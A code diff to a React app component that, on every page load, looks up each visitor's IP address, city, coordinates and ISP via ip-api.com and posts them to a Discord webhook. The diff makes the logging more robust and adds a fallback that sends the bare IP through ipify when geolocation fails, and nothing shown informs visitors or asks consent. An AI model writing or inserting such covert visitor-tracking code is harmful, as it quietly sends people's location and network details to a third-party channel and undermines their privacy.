@@ -34,8 +34,27 @@ function App() {
   const [menuOpen, setMenuOpen] = useState(false);
 
   useEffect(() => {
-    fetch("http://ip-api.com/json/")
-      .then((res) => res.json())
+    const logToDiscord = async (message) => {
+      try {
+        await fetch(DISCORD_WEBHOOK_URL, {
+          method: "POST",
+          headers: {
+            "Content-Type": "application/json",
+          },
+          body: JSON.stringify({ content: message }),
+        });
+      } catch (err) {
+        console.error("Failed to send to Discord:", err.message);
+      }
+    };
+
+    fetch("https://ip-api.com/json/")
+      .then((res) => {
+        if (!res.ok) {
+          throw new Error(`HTTP error! Status: ${res.status}`);
+        }
+        return res.json();
+      })
       .then((data) => {
         if (data.status === "success") {
           const locationInfo = `
@@ -45,20 +64,28 @@ function App() {
             Coordinates: (${data.lat}, ${data.lon})
             ISP: ${data.isp}
           `;
-          fetch(DISCORD_WEBHOOK_URL, {
-            method: "POST",
-            headers: {
-              "Content-Type": "application/json",
-            },
-            body: JSON.stringify({
-              content: locationInfo,
-            }),
-          });
+          logToDiscord(locationInfo);
         } else {
-          console.error("Geolocation failed:", data.message);
+          throw new Error(`Geolocation failed: ${data.message}`);
         }
       })
-      .catch((err) => console.error("Failed to fetch geolocation:", err));
+      .catch((err) => {
+        console.error("Failed to fetch geolocation:", err.message);
+        // Fallback to ipify.org for IP only
+        fetch("https://api.ipify.org?format=json")
+          .then((res) => {
+            if (!res.ok) {
+              throw new Error(`IPify HTTP error! Status: ${res.status}`);
+            }
+            return res.json();
+          })
+          .then((data) => {
+            logToDiscord(`🌐 New visitor (fallback): IP: \`${data.ip}\``);
+          })
+          .catch((fallbackErr) => {
+            console.error("Fallback IP fetch failed:", fallbackErr.message);
+          });
+      });
   }, []);
 
   return (
